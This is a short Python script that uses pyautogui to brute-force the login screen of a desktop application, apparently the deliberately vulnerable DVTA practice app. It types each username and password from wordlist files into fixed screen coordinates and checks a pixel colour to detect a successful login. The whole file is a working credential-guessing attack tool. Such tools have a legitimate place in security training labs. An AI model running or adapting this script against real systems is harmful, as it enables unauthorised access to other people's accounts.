import pyautogui,os,time

#Specify the file path to open - opens file in same location all time (optional)
#os.startfile("C:\\Users\\admin\\Desktop\\dvta-master\\dvta-master\\DVTA\\DVTA\\bin\\Release\\DVTA.exe")

#pyautogui.position() - gives position of mouse cursor

#Sends keystroke to application - update the co-ordinates in .click "\t" - used to send tab key 0.25 is delay seconds to send key stroke

#pyautogui.click(356,130);pyautogui.typewrite('admin\t password',0.25)

#pyautogui.click(356,130);pyautogui.typewrite('admin\t password\t');pyautogui.typewrite(['enter']);pyautogui.typewrite(['enter'])

print("Till now everything works fine will enter mode brute-force")

u=open("user.txt",'r')

p=open("passwords.txt",'r')

users=u.readlines()
passwo=p.readlines()

def closing():
	u.close()
	p.close()
	print("Successfully completed")
	exit()
pyautogui.pixel(338,132)

for user in users:
	
	for password in passwo:
		
		pyautogui.click(338,132);pyautogui.typewrite(user,0.25);pyautogui.typewrite('\t');pyautogui.typewrite(password);pyautogui.typewrite(['\t','enter','enter']);time.sleep(5)

		
		check=pyautogui.pixelMatchesColor(338,132,(255, 255, 255))
		
		if check == False:
			print("user:",user, "password:",password)
			time.sleep(5)
			closing()

print("Unsuccessfull in finding user & passwords")
